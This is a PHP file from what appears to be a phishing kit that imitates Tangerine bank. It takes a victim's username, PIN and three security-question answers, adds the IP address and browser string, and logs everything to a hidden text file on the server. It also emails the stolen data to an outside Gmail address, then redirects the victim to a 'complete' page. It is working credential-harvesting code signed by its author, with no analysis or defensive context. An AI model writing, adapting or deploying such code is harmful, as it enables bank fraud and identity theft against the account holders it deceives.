<?php

error_reporting(0);
$send = "sarkolouty@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginResults---------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "pin : ".$_POST['pin']."\n";
$message .= "-----------------2 QuestionsResults-----------------\n";
$message .= "question : ".$_POST['question1']."\n";
$message .= "answer : ".$_POST['answer1']."\n";
$message .= "question : ".$_POST['question2']."\n";
$message .= "answer : ".$_POST['answer2']."\n";
$message .= "question : ".$_POST['question3']."\n";
$message .= "answer : ".$_POST['answer3']."\n";
$message .= "-----------------created by Seven[723806851]-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------TangerineResults-------------------\n";

$subject = "Tangerine - created by Seven[723806851] ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/ehtgdfh4w3.txt","a+");
fwrite($fp,"Tangerine - Seven[723806851]" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "Tangerine - Seven[723806851]", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "complete.php";

</script>